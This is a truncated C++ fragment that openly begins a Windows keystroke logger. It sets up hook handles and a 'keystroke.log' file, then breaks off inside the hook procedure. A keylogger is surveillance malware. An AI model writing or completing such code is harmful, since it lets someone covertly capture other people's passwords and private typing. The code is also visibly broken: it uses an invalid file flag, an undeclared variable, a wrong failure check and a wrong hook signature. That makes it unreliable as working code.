#include <fcntl.h>
#include <io.h>

using namespace std;

HWND hwnd = 0;
HHOOK hHook = 0;
DWORD dwAsynchronous = 0;
HANDLE hFile = 0;
FILE *f = nullptr;
static int g_bHookInstalled = 0;
static int g_keyCount = 0;

void InitializeKeystrokeLogger()
{
    // Create the log file
    hFile = CreateFile("keystroke.log", GENERIC_READ | GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_APPEND_MODE, 0);
    if (hFile == nullptr)
    {
        cout << "Error: Cannot create keystroke.log file." << endl;
        return;
    }
    f = fileHandle = fopen("keystroke.log", "a");
    if (f == nullptr)
    {
        cout << "Error: Cannot open keystroke.log file." << endl;
        return;
    }
}

void KeyStrokeHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (g_bHookInstalled != 0)
